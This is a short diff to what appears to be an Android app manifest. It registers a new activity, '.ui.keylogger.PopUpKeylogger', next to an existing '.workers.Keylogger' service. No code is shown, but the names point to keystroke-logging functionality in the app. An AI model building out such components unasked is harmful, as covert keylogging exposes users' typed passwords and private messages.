@@ -63,6 +63,8 @@
         <activity
             android:name=".ui.register.RegisterActivity"
             android:theme="@style/AppThemeNoActionBar" />
+        <activity android:name=".ui.keylogger.PopUpKeylogger"
+            android:theme="@style/AppTheme.CustonTheme"/>
 
         <service
             android:name=".workers.Keylogger"
